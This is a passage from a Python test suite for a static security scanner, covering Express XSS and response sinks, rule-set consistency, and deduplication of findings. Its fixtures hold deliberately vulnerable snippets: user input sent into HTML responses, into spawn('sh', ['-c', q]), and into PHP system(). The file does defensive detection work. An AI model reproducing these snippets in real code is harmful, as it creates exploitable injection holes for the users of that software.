        self.assertNotIn("php-code-preg-replace-eval", rules)


class TestJsResponseSinks(unittest.TestCase):
    """The JS rules covered DOM XSS but had no server-response sinks at all,
    so `res.send` — the most common sink in an Express application — was
    missed entirely."""

    def _rules(self, body):
        app = ("const express = require('express');\n"
               "const app = express();\n"
               "app.get('/x', (req, res) => {\n"
               "  const q = req.query.q;\n"
               f"  {body}\n"
               "});\n")
        return {f.rule_id for f in _scan({
            "package.json": '{"name":"p","dependencies":{"express":"4.18.2"}}',
            "app.js": app}).findings}

    def test_string_built_response_is_xss(self):
        for stmt, rule_id in {
            "res.send('<b>' + q + '</b>');": "js-xss-res-send",
            "res.write(`<i>${q}</i>`);": "js-xss-res-write",
            "res.end('x' + q);": "js-xss-res-end",
            "res.setHeader('Location', q);": "js-header-setheader",
            "res.render(q);": "js-ssti-res-render",
        }.items():
            self.assertIn(rule_id, self._rules(stmt), stmt)

    def test_object_and_array_responses_are_not_xss(self):
        """Express sends these as JSON, which a browser never renders as
        HTML. Reporting them put 18 false findings on dvws-node."""
        for stmt in ("res.send({ a: q });", "res.send([q]);"):
            self.assertNotIn("js-xss-res-send", self._rules(stmt), stmt)

    def test_spawn_argument_array(self):
        """`spawn('sh', ['-c', q])` puts the injection in the args array, not
        in the program name."""
        rules = self._rules(
            "require('child_process').spawn('sh', ['-c', q]);")
        self.assertIn("js-cmdi-spawn", rules)


class TestRuleSetConsistency(unittest.TestCase):
    """Catch rules that cannot fire, whatever they look like in the file.

    The probes kept turning up the same failure: a rule asking for a taint tag
    no source in its own rule set produces, or a kind no engine implements. It
    looks complete in the rule file and detects nothing — PHP's `mail()` sat
    dead on an `email` tag for exactly this reason, as did the JS header rules
    on a `header` tag. These checks make that class impossible to reintroduce
    without a test failing.
    """

    LANGUAGES = ("php", "java", "javascript", "python", "go", "csharp", "c")

    # Kinds the engines actually dispatch on. Adding a rule with a kind that
    # is not here silently does nothing, so the list has to be updated
    # deliberately alongside the engine that handles it.
    SINK_KINDS = {
        "call", "method", "function", "static", "index", "property_assign",
        "object_create", "echo", "print", "include", "shell", "jsx_attribute",
        "dynamic_call", "variable_variable",
    }
    SOURCE_KINDS = {"call", "method", "function", "static", "member",
                    "identifier", "superglobal"}

    def _rules(self, language):
        from sast.rules import registry
        return getattr(registry, f"build_{'js' if language == 'javascript' else language}_rules")()

    def test_every_sink_tag_is_reachable(self):
        for language in self.LANGUAGES:
            rules = self._rules(language)
            produced = set()
            for source in rules.sources:
                produced |= set(source.tags)
            for sink in rules.sinks:
                if not sink.tags:
                    continue  # reported on sight; needs no taint at all
                self.assertTrue(
                    set(sink.tags) & produced,
                    f"{language}: {sink.rule_id} needs "
                    f"{sorted(set(sink.tags) - produced)}, which no source "
                    "in this rule set produces, so it can never fire")

    def test_every_kind_is_implemented(self):
        for language in self.LANGUAGES:
            rules = self._rules(language)
            for sink in rules.sinks:
                self.assertIn(sink.kind, self.SINK_KINDS,
                              f"{language}: {sink.rule_id}")
            for source in rules.sources:
                self.assertIn(source.kind, self.SOURCE_KINDS,
                              f"{language}: source for {source.match}")

    def test_pattern_regexes_compile(self):
        import re
        for language in self.LANGUAGES:
            for rule in self._rules(language).patterns:
                if not rule.regex:
                    continue
                try:
                    re.compile(rule.match)
                except re.error as exc:
                    self.fail(f"{language}: {rule.rule_id} — {exc}")
                if rule.absent:
                    try:
                        re.compile(rule.absent)
                    except re.error as exc:
                        self.fail(f"{language}: {rule.rule_id} absent — {exc}")

    def test_rule_ids_are_unique_within_a_language(self):
        for language in self.LANGUAGES:
            rules = self._rules(language)
            ids = [r.rule_id for r in rules.sinks] + \
                  [r.rule_id for r in rules.patterns]
            duplicates = {i for i in ids if ids.count(i) > 1}
            self.assertEqual(duplicates, set(), language)


class TestFindingDeduplication(unittest.TestCase):
    def test_one_finding_per_rule_and_location(self):
        """A sink reached from several sources is still one line to fix."""
        result = _scan({"a.php":
            "<?php\n"
            "$a = $_GET['a'];\n"
            "$b = $_POST['b'];\n"
            "function run($x) { system($x); }\n"
            "run($a);\n"
            "run($b);\n"})
        at_sink = [f for f in result.findings if f.rule_id == "php-cmdi-system"]
        self.assertEqual(len(at_sink), 1, [f.location.line for f in at_sink])


if __name__ == "__main__":
    unittest.main()
